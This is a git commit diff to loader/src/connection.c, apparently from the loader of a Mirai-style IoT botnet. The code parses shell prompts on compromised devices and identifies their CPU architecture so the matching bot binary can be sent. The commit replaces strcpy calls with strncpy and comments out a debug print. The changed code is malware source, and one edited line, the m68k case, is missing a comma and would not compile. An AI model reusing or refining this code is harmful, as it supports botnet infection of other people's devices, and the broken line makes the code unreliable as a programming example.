136332d91e61387d5a53050b02e08d79dbff4aa7
われ <74850252+ware255@users.noreply.github.com>
2022-04-09 22:45:34 +0900

    Update connection.c

--- loader/src/connection.c
+++ loader/src/connection.c
@@ -218,10 +218,10 @@ int connection_consume_prompt(struct connection *conn)
     for (i = conn->rdbuf_pos; i >= 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
-        {
+        {/*
 #ifdef DEBUG
             printf("matched any prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
-#endif
+#endif*/
             prompt_ending = i;
             break;
         }
@@ -494,24 +494,24 @@ int connection_consume_arch(struct connection *conn)
 
         /* arm mpsl spc m68k ppc x86 mips sh4 */
         if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
-            strcpy(conn->info.arch, "arm");
+            strncpy(conn->info.arch, "arm", 6);
         else if (ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
         {
             if (ehdr->e_ident[EI_DATA] == EE_LITTLE)
-                strcpy(conn->info.arch, "mpsl");
+                strncpy(conn->info.arch, "mpsl", 6);
             else
-                strcpy(conn->info.arch, "mips");
+                strncpy(conn->info.arch, "mips", 6);
         }
         else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
-            strcpy(conn->info.arch, "x86");
+            strncpy(conn->info.arch, "x86", 6);
         else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
-            strcpy(conn->info.arch, "spc");
+            strncpy(conn->info.arch, "spc", 6);
         else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
-            strcpy(conn->info.arch, "m68k");
+            strncpy(conn->info.arch, "m68k" 6);
         else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
-            strcpy(conn->info.arch, "ppc");
+            strncpy(conn->info.arch, "ppc", 6);
         else if (ehdr->e_machine == EM_SH)
-            strcpy(conn->info.arch, "sh4");
+            strncpy(conn->info.arch, "sh4", 6);
         else
         {
             conn->info.arch[0] = 0;
@@ -547,7 +547,7 @@ int connection_consume_arm_subtype(struct connection *conn)
 #ifdef DEBUG
         printf("[FD%d] Arch has ARMv7!\n", conn->fd);
 #endif*/
-        strcpy(conn->info.arch, "arm7");
+        strncpy(conn->info.arch, "arm7", 6);
     }
 
     return offset;
